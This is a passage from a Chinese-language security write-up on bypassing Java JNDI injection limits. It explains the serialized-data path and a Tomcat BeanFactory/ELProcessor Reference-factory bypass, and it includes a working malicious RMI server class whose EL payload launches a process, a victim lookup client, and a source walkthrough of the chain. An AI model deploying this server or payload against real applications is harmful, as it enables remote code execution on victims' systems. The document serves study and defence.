    }
先来看第⼀个判断
JAVA_ATTRIBUTES[1] => javaSerializedData
在第⼀个判断中会判断我们返回的值获取 javaSerializedData 所对应的值，如果不为 null 的话就会调⽤ 
deserializeObject 进⾏反序列化，这不就是我们当前的 bypass ⼿法嘛
所以如果我们当前 classpath 中存在 CommonsCollections 3.1-3.2.1 那么这⾥就会直接进⾏触发
接下来看第⼆个判断
JAVA_ATTRIBUTES[7] => javaRemoteLocation，JAVA_ATTRIBUTES[2] => javaClassName
如果返回值中 javaRemoteLocation 对应的数值不为 null 就会调⽤ decodeRmiObject 函数
在 decodeRmiObject 中 new 了⼀个 Reference并进⾏返回 
接下来看第三个判断
这个判断其实就是 jndi 注⼊的触发点，即远程加载 class 并反序列化 
            if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {
                ClassLoader var3 = helper.getURLClassLoader(var2);
                return deserializeObject((byte[])((byte[])var1.get()), var3);
            } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {
                return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), 
(String)var1.get(), var2);
            } else {
                var1 = var0.get(JAVA_ATTRIBUTES[0]);
                return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) && 
!var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);
            }
if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {
  ClassLoader var3 = helper.getURLClassLoader(var2);
  return deserializeObject((byte[])((byte[])var1.get()), var3);
}
else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {
                return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), 
(String)var1.get(), var2);
            } 
然后就是 urlclassloader 远程获取并进⾏反序列化操作
else {
                var1 = var0.get(JAVA_ATTRIBUTES[0]);
                return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) && 
!var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);
            }
0x02 Bypass 2：利⽤本地Class作为Reference Factory
RMI 返回的 Reference 对象会指定⼀个 Factory，正常情况下会调⽤ factory.getObjectInstance 来远程获取外部
对象实例，但是由于 codebase 限制，我们不能加载未受信任的地址。
所以我们可以构造 Reference 并将其指向我们本地 classpath 中存在的类，但是该类必须要符合⼀些条件（下⽂有
介绍）
本种bypass⽅法利⽤了 org.apache.naming.factory.BeanFactory ，中会通过反射的⽅式实例化Reference所指向
的任意Bean Class，并且会调⽤setter⽅法为所有的属性赋值。⽽该Bean Class的类名、属性、属性值，全都来⾃
于Reference对象，均是攻击者可控的。
该包存在于 Tomcat 依赖包所以应⽤还是⽐较⼴泛 
Evil RMI Server
RefAddr var17 = (RefAddr)deserializeObject(var13.decodeBuffer(var6.substring(var19)), 
var14);
var15.setElementAt(var17, var12);
package JNDI.FactoryBypass.Server;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
public class HackerRmiServer {
    public static void lanuchRMIregister(Integer rmi_port) throws Exception {
        System.out.println("Creating RMI Registry, RMI Port:"+rmi_port);
pom.xml
        Registry registry = LocateRegistry.createRegistry(rmi_port);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", 
true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", 
"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineB
yName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']
(['/usr/bin/open','/System/Applications/Calculator.app']).start()\")"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Exploit", referenceWrapper);
        System.out.println(referenceWrapper.getReference());
    }
    public static void main(String[] args) throws Exception {
        lanuchRMIregister(1099);
    }
}
            org.apache.tomcat
            tomcat-catalina
            9.0.20
            org.apache.tomcat
            tomcat-dbcp
            9.0.8
            org.apache.tomcat
            tomcat-jasper
            9.0.20
Victim Client
分析
客户端前期获取 stub 的过程这边就不多介绍了，感兴趣的师傅可以⾃⼰调试⼀下 
com.sun.jndi.rmi.registry#RegistryContext 
这⾥的 var2 就是 stub，我们直接跟进 decodeObject
来看 decodeObject 函数，前半部分就是获取 Reference 然后赋值给 var8 ，接下来会有⼀个判断：
1. 获取到的 Reference 是否为null
2. Reference 中 classFactoryLocation 是否为null
3. trustURLCodebase  是否为 true
由于是 bypass jndi 所以 codebase ⾃然是为 true 的 ，同时这⾥的 classFactoryClassLocation 也为 null 所以进
⼊到  NamingManager.getObjectInstance
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.util.Hashtable;
public class VictimClient {
    public static void main(String[] args) throws NamingException {
        Hashtable env = new Hashtable<>();
        Context context = new InitialContext(env);
        context.lookup("rmi://127.0.0.1:1099/Exploit");
    }
}
NamingManager.getObjectInstance 
在前⾯有说到客户端收到 RMI Server 返回到 reference ，其中 reference 会指向⼀个 factory，所以⾸先调⽤ 
String f = ref.getFactoryClassName();  将 reference 中指向的 factory 获取其名字，然后传⼊ 
getObjectFactoryFromReference(ref, f);  在该函数中会将 factory 进⾏实例化
在 getObjectFactoryFromReference 中对 factory 进⾏了实例化，这⾥的 factory 就是我们恶意 RMI Server 中构
造 reference 所指向的 factory  org.apache.naming.factory.BeanFactory
重新回到  NamingManager.getObjectInstance  ，这⾥的 factory 已实例化，接下来掉⽤了 factory 的 
getObjectInstance 函数
所以这⾥其实我们可以看到这⾥我们 reference 指定的 factory 类并不是任意都可以的，必须要有 
getObjectInstance ⽅法
factory#getObjectInstance ⽅法就是⽤来获取远程对象实例的
接下来就会来到我们指定的  org.apache.naming.factory.BeanFactory  中的 getObjectInstance ⽅法 
在分析函数之前我们先来看看我们 RMI Server 上的 payload 
在 getObjectInstance 函数的开头，通过 getClassName 获取了我们 payload 中指定的 javax.el.ELProcessor 类
并进⾏了实例化
（为什么要指定这个类在下⽂进⾏介绍）
继续看函数的下半部分，⾸先对  javax.el.ELProcessor 进⾏了实例化，并调⽤ ref.get("forceString") 获取到 ra 
来到 if ⾥⾯，通过 getContent 获取值 x=eval ，然后会设置参数类型为 String， Class[] paramTypes = 
new Class[]{String.class}; ，如果value 中存在 , 就进⾏分割
接下来会获取 value 中 =  的索引位置，如果value中存在 = 就会进⾏分割赋值，如果不存在 = 就会获取param 的 
set 函数
如 param 为 demo => setDemo
        // 指定了执⾏了 className 为 javax.el.ELProcessor ，在 getObjectInstance 中会调⽤ 
getClassName 获取 className 并进⾏世例化
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", 
true,"org.apache.naming.factory.BeanFactory",null);
        // 设置 forceString 为 x=eval
        ref.add(new StringRefAddr("forceString", "x=eval"));
        // 同样对 x 进⾏设置，具体原因看下⽂ 
        ref.add(new StringRefAddr("x", 
"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineB
yName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']
(['/usr/bin/open','/System/Applications/Calculator.app']).start()\")"));
Type: forceString
Content: x=eval
然后来到 forced.put(param, beanClass.getMethod(propName, paramTypes));  将 param 和 ⽅法添加到 
forced 这个map 中
然后从 forced 中取出⽅法进⾏反射调⽤
所以这⾥就来解释⼀下为什么找 public java.lang.Object 
javax.el.ELProcessor.eval(java.lang.String)  ⽽不是其他类
其实从上⾯的代码可看出要想被添加到 forced 中需要符合⼀些条件 
1. ⽬标类必须有⽆参构造函数 => beanClass.getConstructor().newInstance()
2. 函数要为 public 同时参数类型为 String => forced.put(param, beanClass.getMethod(propName, 
paramTypes));
所以这⾥要实现 RCE 的化ELProcessor#eval ⾃然是最合适不过的了 
所以作者显示寻找到了 org.apache.naming.factory.BeanFactory  然后在该类的 getObjectInstance ⽅法中
能调⽤符合特定要求的 String ⽅法，所以作者寻找到了 javax.el.ELProcessor#eval  并在 getObjectInstance 
中通过反射实例化了 ELProcessor 类最终调⽤ eval ⽅法
0x03 参考链接
https://www.veracode.com/blog/research/exploiting-jndi-injections-java
https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA